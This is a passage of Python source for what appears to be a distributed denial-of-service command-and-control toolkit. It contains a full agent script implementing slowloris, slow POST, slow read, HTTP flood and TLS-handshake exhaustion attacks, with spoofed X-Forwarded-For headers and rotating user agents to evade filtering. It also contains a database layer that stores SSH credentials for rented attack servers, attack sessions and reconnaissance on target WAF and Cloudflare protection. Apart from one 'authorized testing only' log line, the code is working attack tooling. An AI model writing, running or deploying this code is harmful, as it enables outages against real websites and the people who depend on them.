                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    request += "Pragma: no-cache\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                    
                    # Convert escape sequences to actual bytes
                    request_bytes = request.encode().decode('unicode_escape').encode()
                    
                    sock.send(request_bytes)
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent']+=1
                        self.stats['bytes_sent'] += len(request_bytes)
                    
                    if (i+1) % 100 == 0:
                        logger.info(f"{i+1}/{num_conns} connections created")
                        
                except Exception as e:
                    with self.lock:
                        self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
            
            # Small delay to avoid overwhelming local resources
            if i % 100 == 0:
                time.sleep(0.1)
        
        with self.lock:
            self.stats['active']=len(self.conns)
        logger.info(f"Initial connections complete. Active: {len(self.conns)}")
        
        if not self.conns:
            logger.error("No connections established, aborting attack")
            return
        
        # Keep connections alive phase
        logger.info("Starting keep-alive phase...")
        cycle_count=0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Time limit reached, stopping attack...")
                break
            
            cycle_count+=1
            active_before=len(self.conns)
            
            # Send headers to keep connections alive
            failed_socks = []
            headers_per_cycle = random.randint(1, 3)  # Multiple headers per cycle
            
            for sock in self.conns:
                try:
                    # Send multiple headers to increase server load
                    for _ in range(headers_per_cycle):
                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
                        header = f"X-{header_name}: {header_value}\\r\\n"
                        header_bytes = header.encode().decode('unicode_escape').encode()
                        
                        sock.send(header_bytes)
                        with self.lock:
                            self.stats['sent']+=1
                            self.stats['bytes_sent'] += len(header_bytes)
                    
                except Exception:
                    failed_socks.append(sock)
                    with self.lock:
                        self.stats['errors']+=1
            
            # Remove failed connections
            for sock in failed_socks:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
                # Try to replace lost connections
                new_sock=self.create_socket()
                if new_sock:
                    try:
                        # Full request with randomization
                        req = f"GET /?session={random.randint(100000,999999)}&attempt=1 HTTP/1.1\\r\\n"
                        req += f"Host: {self.host}\\r\\n"
                        req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
                        req += "Connection: keep-alive\\r\\n"
                        req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
                        req_bytes = req.encode().decode('unicode_escape').encode()
                        
                        new_sock.send(req_bytes)
                        self.conns.append(new_sock)
                        with self.lock:
                            self.stats['sent']+=1
                            self.stats['bytes_sent'] += len(req_bytes)
                    except Exception:
                        try:
                            new_sock.close()
                        except:
                            pass
            
            with self.lock:
                self.stats['active']=len(self.conns)
                active_after=len(self.conns)
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            # Calculate and log metrics
            elapsed = time.time() - self.start_time
            mb_sent = bytes_sent / (1024 * 1024)
            
            logger.info(f"Cycle {cycle_count} | Active: {active_after} | Headers: {sent} | Errors: {errors} | Data: {mb_sent:.2f} MB | Uptime: {int(elapsed)}s")
            
            # Write status file for monitoring
            self.write_status_file()
            
            # Delay before next cycle
            time.sleep(delay)
    
    def slow_read_attack(self, num_conns=50, delay=10, duration=0):
        """Execute a Slow Read attack"""
        logger.info(f"Starting Slow Read attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        self.start_time=time.time()
        
        while time.time() - self.start_time < duration and self.running:
            try:
                s = self.create_socket()
                if s:
                    # Send a complete HTTP request but read the response very slowly
                    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}"
                    http_request = (
                        f"GET /?id={random.randint(1000,9999)}&t={time.time()} HTTP/1.1\\r\\n"
                        f"Host: {self.host}\\r\\n"
                        f"User-Agent: {user_agent}\\r\\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                        f"Accept-Language: en-US,en;q=0.5\\r\\n"
                        f"Accept-Encoding: gzip, deflate\\r\\n"
                        f"Connection: keep-alive\\r\\n"
                        f"Cache-Control: no-cache\\r\\n\\r\\n"
                    )
                    
                    request_bytes = http_request.encode().decode('unicode_escape').encode()
                    s.send(request_bytes)
                    
                    with self.lock:
                        self.stats['active'] += 1
                        self.stats['sent'] += 1
                        self.stats['bytes_sent'] += len(request_bytes)
                    
                    # Read response very slowly, 1 byte at a time with delays
                    while self.running:
                        try:
                            s.recv(1)
                            time.sleep(delay)
                        except:
                            break
                    
                    try:
                        s.close()
                        with self.lock:
                            self.stats['active'] -= 1
                    except:
                        pass
            except Exception as e:
                logger.debug(f"Error in Slow Read attack: {e}")
                with self.lock:
                    self.stats['errors'] += 1
            
            # Write status file for monitoring
            self.write_status_file()
            
            # Small delay before creating a new connection
            time.sleep(1)
    
    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
        logger.info(f"Starting Slow POST attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        self.start_time=time.time()
        
        def post_worker(worker_id):
            sock=self.create_socket()
            if not sock:
                logger.warning(f"Worker {worker_id}: Failed to connect")
                return
            
            try:
                # Large content-length
                content_length=random.randint(1000000,10000000)  # 1MB to 10MB range
                
                # Proper HTTP POST format
                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
                post_request += f"Host: {self.host}\\r\\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request += f"Content-Length: {content_length}\\r\\n"
                post_request += "Connection: keep-alive\\r\\n"
                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
                post_request += "\\r\\n"  # End of headers
                
                # Convert escape sequences properly
                post_bytes = post_request.encode().decode('unicode_escape').encode()
                
                sock.send(post_bytes)
                with self.lock:
                    self.stats['sent']+=1
                    self.stats['bytes_sent'] += len(post_bytes)
                    
                logger.info(f"Worker {worker_id}: POST headers sent, content-length: {content_length:,} bytes")
                
                # Send POST data extremely slowly
                bytes_sent=0
                chunk_sizes=[1,2,3,4,5,8,10]  # Variable chunk sizes
                
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - self.start_time) >= duration:
                        logger.info(f"Worker {worker_id}: Duration limit reached")
                        break
                    
                    # Variable chunk size for unpredictability
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    # Generate data chunk
                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += remaining
                        with self.lock:
                            self.stats['sent'] += remaining
                            self.stats['bytes_sent'] += remaining
                    except Exception:
                        logger.warning(f"Worker {worker_id}: Connection lost at {bytes_sent:,} bytes")
                        break
                    
                    # Progress report every 100KB
                    if bytes_sent % 100000 == 0:
                        progress = (bytes_sent/content_length)*100
                        logger.info(f"Worker {worker_id}: Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                        
                        # Update status file
                        self.write_status_file()
                    
                    # Slow transmission
                    time.sleep(delay)
                
                logger.info(f"Worker {worker_id}: Completed: {bytes_sent:,} bytes sent")
                
            except Exception as e:
                logger.error(f"Worker {worker_id}: Error: {str(e)}")
                with self.lock:
                    self.stats['errors']+=1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # Start worker threads
        threads=[]
        logger.info(f"Starting {num_conns} worker threads...")
        
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            logger.info(f"Thread {i+1}: Worker started")
            time.sleep(0.1)  # Small stagger to avoid overwhelming
        
        # Monitor all threads
        while self.running:
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Duration limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            # Calculate metrics
            elapsed = time.time() - self.start_time
            mb_sent = bytes_sent / (1024 * 1024)
            
            logger.info(f"STATUS: Active workers: {active_threads}/{num_conns} | Data sent: {mb_sent:.2f} MB | Errors: {errors} | Uptime: {int(elapsed)}s")
            
            # Write status file
            self.write_status_file()
            
            if active_threads == 0:
                logger.info("All workers completed")
                break
            
            time.sleep(10)  # Status update interval
    
    def http_flood_attack(self, num_conns=100, requests_per_conn=100, duration=0):
        """Execute an HTTP Flood attack"""
        logger.info(f"Starting HTTP Flood attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Requests per connection: {requests_per_conn}, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running = True
        self.start_time = time.time()
        
        def flood_worker(worker_id):
            """Worker thread for HTTP flooding"""
            requests_sent = 0
            errors = 0
            
            while self.running and (requests_sent < requests_per_conn or requests_per_conn == 0):
                # Check duration limit
                if duration > 0 and (time.time() - self.start_time) >= duration:
                    logger.info(f"Worker {worker_id}: Duration limit reached")
                    break
                
                # Create a new socket for each request
                sock = self.create_socket()
                if not sock:
                    errors += 1
                    time.sleep(0.1)
                    continue
                
                try:
                    # Generate random path and query parameters
                    path = random.choice(["/", "/index.html", "/home", "/about", "/contact", "/products", "/services"])
                    query = f"?id={random.randint(1000,9999)}&t={time.time()}&r={random.random()}"
                    
                    # Random user agent
                    user_agents = [
                        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}",
                        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}_{random.randint(1,7)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}",
                        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(60,110)}.0) Gecko/20100101 Firefox/{random.randint(60,110)}.0",
                        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(10,15)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(10,15)}.0 Mobile/15E148 Safari/604.1"
                    ]
                    user_agent = random.choice(user_agents)
                    
                    # Build HTTP request
                    http_request = (
                        f"GET {path}{query} HTTP/1.1\\r\\n"
                        f"Host: {self.host}\\r\\n"
                        f"User-Agent: {user_agent}\\r\\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\n"
                        f"Accept-Language: en-US,en;q=0.5\\r\\n"
                        f"Accept-Encoding: gzip, deflate\\r\\n"
                        f"Connection: close\\r\\n"  # Use 'close' to free up connections
                        f"Cache-Control: no-cache\\r\\n"
                        f"Pragma: no-cache\\r\\n\\r\\n"
                    )
                    
                    request_bytes = http_request.encode().decode('unicode_escape').encode()
                    sock.send(request_bytes)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        self.stats['bytes_sent'] += len(request_bytes)
                    
                    requests_sent += 1
                    
                    # Optionally read the response
                    try:
                        sock.settimeout(2)  # Short timeout for reading response
                        sock.recv(1024)  # Read some of the response
                    except:
                        pass
                    
                except Exception as e:
                    errors += 1
                    with self.lock:
                        self.stats['errors'] += 1
                
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                
                # Small delay between requests
                time.sleep(0.01)
            
            logger.info(f"Worker {worker_id}: Completed {requests_sent} requests with {errors} errors")
        
        # Start worker threads
        threads = []
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=flood_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            
            # Stagger thread starts
            if i % 10 == 0:
                time.sleep(0.1)
        
        # Monitor threads
        while self.running:
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Duration limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            # Calculate metrics
            elapsed = time.time() - self.start_time
            mb_sent = bytes_sent / (1024 * 1024)
            rps = sent / elapsed if elapsed > 0 else 0
            
            logger.info(f"HTTP Flood: Active threads: {active_threads}/{num_conns} | Requests: {sent} | RPS: {rps:.2f} | Data: {mb_sent:.2f} MB | Errors: {errors}")
            
            # Write status file
            self.write_status_file()
            
            if active_threads == 0:
                logger.info("All workers completed")
                break
            
            time.sleep(5)
    
    def ssl_exhaust_attack(self, num_conns=50, duration=0):
        """Execute an SSL/TLS exhaustion attack"""
        logger.info(f"Starting SSL/TLS exhaustion attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running = True
        self.start_time = time.time()
        
        def ssl_worker(worker_id):
            """Worker thread for SSL exhaustion"""
            connections_made = 0
            errors = 0
            
            while self.running:
                # Check duration limit
                if duration > 0 and (time.time() - self.start_time) >= duration:
                    logger.info(f"Worker {worker_id}: Duration limit reached")
                    break
                
                try:
                    # Create raw socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.host, self.port))
                    
                    # Send SSL/TLS Client Hello but don't complete handshake
                    # This is a simplified version - in reality, you'd need to craft a proper TLS handshake
                    client_hello = b"\\x16\\x03\\x01\\x00\\xdc\\x01\\x00\\x00\\xd8\\x03\\x03"
                    sock.send(client_hello)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        self.stats['bytes_sent'] += len(client_hello)
                        self.stats['active'] += 1
                    
                    connections_made += 1
                    
                    # Keep the connection open without completing handshake
                    time.sleep(random.uniform(1, 5))
                    
                except Exception as e:
                    errors += 1
                    with self.lock:
                        self.stats['errors'] += 1
                
                finally:
                    try:
                        sock.close()
                        with self.lock:
                            self.stats['active'] -= 1
                    except:
                        pass
                
                # Small delay between connection attempts
                time.sleep(0.1)
            
            logger.info(f"Worker {worker_id}: Made {connections_made} SSL connection attempts with {errors} errors")
        
        # Start worker threads
        threads = []
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=ssl_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            
            # Stagger thread starts
            if i % 5 == 0:
                time.sleep(0.2)
        
        # Monitor threads
        while self.running:
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Duration limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                active = self.stats['active']
                errors = self.stats['errors']
            
            # Calculate metrics
            elapsed = time.time() - self.start_time
            
            logger.info(f"SSL Exhaust: Active threads: {active_threads}/{num_conns} | Connections: {sent} | Active: {active} | Errors: {errors} | Uptime: {int(elapsed)}s")
            
            # Write status file
            self.write_status_file()
            
            if active_threads == 0:
                logger.info("All workers completed")
                break
            
            time.sleep(5)
    
    def write_status_file(self):
        """Write status to file for monitoring"""
        try:
            status_dir = "/tmp/slowhttp_c2"
            os.makedirs(status_dir, exist_ok=True)
            
            with self.lock:
                status = {
                    'active': self.stats['active'],
                    'sent': self.stats['sent'],
                    'errors': self.stats['errors'],
                    'bytes_sent': self.stats['bytes_sent'],
                    'uptime': int(time.time() - self.start_time),
                    'timestamp': time.time()
                }
            
            with open(f"{status_dir}/status.json", 'w') as f:
                json.dump(status, f)
        except Exception as e:
            logger.error(f"Failed to write status file: {str(e)}")
    
    def stop_attack(self):
        logger.info("Stopping attack...")
        self.running=False
        
        # Close all connections
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        logger.info("Attack stopped")

# Better signal handling
attacker = None

def signal_handler(sig,frame):
    global attacker
    logger.info("Received interrupt signal")
    if attacker:
        attacker.stop_attack()
    logger.info("Shutting down...")
    sys.exit(0)

def main():
    global attacker
    
    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent')
    parser.add_argument('target',help='Target URL or hostname')
    parser.add_argument('attack_type',choices=['slowloris','slow_post','slow_read','http_flood','ssl_exhaust'],help='Type of attack to perform')
    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100)')
    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15)')
    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
    parser.add_argument('--requests','-r',type=int,default=1000,help='Requests per connection for HTTP flood (default: 1000)')
    
    args=parser.parse_args()
    
    # Validate arguments
    if args.connections < 1:
        logger.error("Connections must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        logger.error("Delay cannot be negative")
        sys.exit(1)
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed=urlparse(args.target)
        target_host=parsed.hostname
        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host=args.target.split(':')[0]
        if ':' in args.target:
            try:
                target_port = int(args.target.split(':')[1])
            except ValueError:
                target_port = 80
        else:
            target_port=80
    
    logger.info("=" * 60)
    logger.info("SLOW HTTP ATTACK AGENT")
    logger.info("=" * 60)
    logger.info(f"Target: {target_host}:{target_port}")
    logger.info(f"Attack: {args.attack_type.upper()}")
    logger.info(f"Connections: {args.connections}")
    logger.info(f"Delay: {args.delay}s")
    logger.info(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    logger.info("=" * 60)
    logger.info("WARNING: FOR AUTHORIZED TESTING ONLY!")
    logger.info("=" * 60)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)
    
    # Create attacker instance
    attacker=SlowHTTPAttack(target_host,target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "http_flood":
            attacker.http_flood_attack(args.connections, args.requests, args.duration)
        elif args.attack_type == "ssl_exhaust":
            attacker.ssl_exhaust_attack(args.connections, args.duration)
    except KeyboardInterrupt:
        logger.info("Interrupted, stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        attacker.stop_attack()
    finally:
        logger.info("Attack completed")

if __name__ == "__main__":
    main()
'''
    
    def _get_advanced_agent_script(self):
        """Get the advanced agent script with additional attack methods"""
        # This would be a more sophisticated version of the agent script
        # For brevity, we'll return the standard script for now
        return self._get_standard_agent_script()
    
    def get_connection_status(self, ip):
        """Check if connection is active"""
        return ip in self.connections and self._check_connection_alive(ip)
    
    def close_all_connections(self):
        """Close all SSH connections"""
        for ip in list(self.connections.keys()):
            self.disconnect_vps(ip)
        logger.info("All SSH connections closed")

class DatabaseManager:
    """Manages database operations with improved error handling and performance"""
    
    def __init__(self, db_file='c2_database.db'):
        """Initialize database manager with specified database file"""
        self.db_file = db_file
        self.connection_pool = queue.Queue(maxsize=5)  # Connection pool for better performance
        self.init_database()
        
        # Fill connection pool
        for _ in range(3):  # Start with 3 connections in the pool
            self._add_connection_to_pool()
    
    def _add_connection_to_pool(self):
        """Add a new connection to the pool"""
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row  # Return rows as dictionaries
            self.connection_pool.put(conn, block=False)
            return True
        except queue.Full:
            # Pool is full, close the connection
            conn.close()
            return False
        except Exception as e:
            logger.error(f"Failed to create database connection: {str(e)}")
            return False
    
    def _get_connection(self):
        """Get a connection from the pool or create a new one"""
        try:
            # Try to get a connection from the pool (non-blocking)
            return self.connection_pool.get(block=False)
        except queue.Empty:
            # Pool is empty, create a new connection
            try:
                conn = sqlite3.connect(self.db_file)
                conn.row_factory = sqlite3.Row
                return conn
            except Exception as e:
                logger.error(f"Failed to create database connection: {str(e)}")
                return None
    
    def _return_connection(self, conn):
        """Return a connection to the pool or close it"""
        if conn:
            try:
                self.connection_pool.put(conn, block=False)
            except queue.Full:
                # Pool is full, close the connection
                conn.close()
    
    def init_database(self):
        """Initialize database with improved schema and error handling"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # VPS nodes table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps_nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL UNIQUE,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ssh_port INTEGER DEFAULT 22,
                    status TEXT DEFAULT 'offline',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP,
                    location TEXT,
                    capabilities TEXT,
                    last_check_result TEXT,
                    system_info TEXT,
                    tags TEXT,
                    notes TEXT
                )
            ''')
            
            # Attack sessions table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_name TEXT NOT NULL,
                    target_url TEXT NOT NULL,
                    target_host TEXT,
                    attack_type TEXT NOT NULL,
                    vps_nodes TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT DEFAULT 'pending',
                    parameters TEXT,
                    results TEXT,
                    success_rate REAL,
                    notes TEXT,
                    target_info TEXT
                )
            ''')
            
            # Attack results table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    vps_ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connections_active INTEGER DEFAULT 0,
                    packets_sent INTEGER DEFAULT 0,
                    bytes_sent INTEGER DEFAULT 0,
                    status TEXT,
                    cpu_usage REAL,
                    memory_usage REAL,
                    error_count INTEGER DEFAULT 0,
                    response_codes TEXT,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
                )
            ''')
            
            # System logs table for better auditing
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    event_type TEXT,
                    description TEXT,
                    source_ip TEXT,
                    user_agent TEXT,
                    severity TEXT
                )
            ''')
            
            # Target information table for reconnaissance data
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS target_info (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    host TEXT NOT NULL UNIQUE,
                    ip_addresses TEXT,
                    open_ports TEXT,
                    web_server TEXT,
                    waf_detected BOOLEAN DEFAULT 0,
                    waf_type TEXT,
                    cloudflare_protected BOOLEAN DEFAULT 0,
                    ssl_info TEXT,
                    dns_records TEXT,
                    whois_info TEXT,
                    scan_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    notes TEXT
                )
            ''')
            
            conn.commit()
            
            # Set secure permissions
            os.chmod(self.db_file, 0o600)
            logger.info(f"Database initialized: {self.db_file}")
            
        except sqlite3.Error as e:
            logger.error(f"Database initialization error: {str(e)}")
            if conn:
                conn.rollback()
            raise
        finally:
            if conn:
                conn.close()
    
    def execute_query(self, query, params=(), fetch_one=False, fetch_all=False):
        """Execute SQL query with proper error handling and connection management"""
        conn = self._get_connection()
        if not conn:
            logger.error("Failed to get database connection")
            return None
            
        try:
            cursor = conn.cursor()
            cursor.execute(query, params)
            
            result = None
            if fetch_one:
                result = cursor.fetchone()
            elif fetch_all:
                result = cursor.fetchall()
            else:
                conn.commit()
                result = cursor.lastrowid
                
            return result
        except sqlite3.Error as e:
            conn.rollback()
            logger.error(f"Database error: {str(e)}")
            logger.error(f"Query: {query}")
            logger.error(f"Params: {params}")
            return None
        finally:
            self._return_connection(conn)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown", tags=None):
        """Add VPS to database with input validation and tags support"""
        try:
            # Input validation
            if not ip or not username or not encrypted_password:
                return None, "Missing required fields"
            
            # Check if VPS already exists
            existing = self.execute_query(
                "SELECT id FROM vps_nodes WHERE ip_address = ?", 
                (ip,), 
                fetch_one=True
            )
            
            if existing:
                return None, "VPS with this IP already exists"
            
            # Process tags
            tags_json = json.dumps(tags) if tags else None
            
            # Insert new VPS
            vps_id = self.execute_query(
                '''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, tags)
                VALUES (?, ?, ?, ?, ?, ?)
                ''', 
                (ip, username, encrypted_password, port, location, tags_json)
            )
            
            # Log the action
            self.log_system_event("vps_added", f"Added VPS {ip}", ip)
            
            return vps_id, "VPS added successfully"
        except Exception as e:
            logger.error(f"Error adding VPS: {str(e)}")
            return None, f"Error: {str(e)}"
    
    def get_all_vps(self):
        """Get all VPS nodes with error handling"""
        try:
            return self.execute_query(
                'SELECT * FROM vps_nodes ORDER BY id', 
                fetch_all=True
            ) or []
        except Exception as e:
            logger.error(f"Error getting VPS list: {str(e)}")
            return []
    
    def update_vps_status(self, ip, status, check_result=None):
        """Update VPS status with additional info"""
        try:
            query = '''
                UPDATE vps_nodes 
                SET status = ?, last_seen = ?
            '''
            params = [status, datetime.now().isoformat()]
            
            if check_result:
                query += ", last_check_result = ?"
                params.append(check_result)
                
            query += " WHERE ip_address = ?"
            params.append(ip)
            
            self.execute_query(query, tuple(params))
            return True
        except Exception as e:
            logger.error(f"Error updating VPS status: {str(e)}")
            return False
    
    def update_vps_system_info(self, ip, system_info):
        """Update VPS system information"""
        try:
            self.execute_query(
                "UPDATE vps_nodes SET system_info = ? WHERE ip_address = ?",
                (json.dumps(system_info), ip)
            )
            return True
        except Exception as e:
            logger.error(f"Error updating VPS system info: {str(e)}")
            return False
    
    def update_vps_notes(self, ip, notes):
        """Update VPS notes"""
        try:
            self.execute_query(
                "UPDATE vps_nodes SET notes = ? WHERE ip_address = ?",
                (notes, ip)
            )
            return True
        except Exception as e:
            logger.error(f"Error updating VPS notes: {str(e)}")
            return False
    
    def update_vps_tags(self, ip, tags):
        """Update VPS tags"""
        try:
            self.execute_query(
                "UPDATE vps_nodes SET tags = ? WHERE ip_address = ?",
                (json.dumps(tags), ip)
            )
            return True
        except Exception as e:
            logger.error(f"Error updating VPS tags: {str(e)}")
            return False
    
    def remove_vps(self, ip):
        """Remove VPS with confirmation and logging"""
        try:
            result = self.execute_query(
                'DELETE FROM vps_nodes WHERE ip_address = ?', 
                (ip,)
            )
            
            if result:
                self.log_system_event("vps_removed", f"Removed VPS {ip}", ip)
                return True
            return False
        except Exception as e:
            logger.error(f"Error removing VPS: {str(e)}")
            return False
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters, target_info=None):
        """Create attack session with improved validation and target info"""
        try:
            # Input validation
            if not session_name or not target_url or not attack_type or not vps_list:
                return None, "Missing required fields"
                
            # Sanitize inputs
            session_name = re.sub(r'[^\w\-_]', '_', session_name)
            
            session_id = self.execute_query(
                '''
                INSERT INTO attack_sessions 
                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status, target_info)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', 
                (
                    session_name, 
                    target_url, 
                    target_host, 
                    attack_type, 
                    json.dumps(vps_list), 
                    json.dumps(parameters), 
                    datetime.now().isoformat(), 
                    'running',
                    json.dumps(target_info) if target_info else None
                )
            )
            
            # Log the action
            self.log_system_event(
                "attack_started", 
                f"Started {attack_type} attack on {target_host} using {len(vps_list)} VPS", 
                target_host
            )
            
            return session_id, "Attack session created"
        except Exception as e:
            logger.error(f"Error creating attack session: {str(e)}")
            return None, f"Error: {str(e)}"
    
    def get_attack_sessions(self, limit=20, status=None):
        """Get attack sessions with filtering by status"""
        try:
            query = 'SELECT * FROM attack_sessions'
            params = []
            
            if status:
                query += ' WHERE status = ?'
                params.append(status)
                
            query += ' ORDER BY start_time DESC LIMIT ?'
            params.append(limit)
            
            return self.execute_query(query, tuple(params), fetch_all=True) or []
        except Exception as e:
            logger.error(f"Error getting attack sessions: {str(e)}")
            return []
    
    def get_attack_session(self, session_id):
        """Get a specific attack session by ID"""
        try:
            return self.execute_query(
                'SELECT * FROM attack_sessions WHERE id = ?',
                (session_id,),
                fetch_one=True
            )
        except Exception as e:
            logger.error(f"Error getting attack session {session_id}: {str(e)}")
            return None
    
    def update_attack_status(self, session_id, status, results=None):
        """Update attack session status"""
        try:
            query = "UPDATE attack_sessions SET status = ?"
            params = [status]
            
            if status in ['stopped', 'completed', 'failed']:
                query += ", end_time = ?"
                params.append(datetime.now().isoformat())
            
            if results:
                query += ", results = ?"
                params.append(json.dumps(results))
                
            query += " WHERE id = ?"
            params.append(session_id)
            
            self.execute_query(query, tuple(params))
            return True
        except Exception as e:
            logger.error(f"Error updating attack status: {str(e)}")
            return False
    
    def update_attack_notes(self, session_id, notes):
        """Update attack session notes"""
        try:
            self.execute_query(
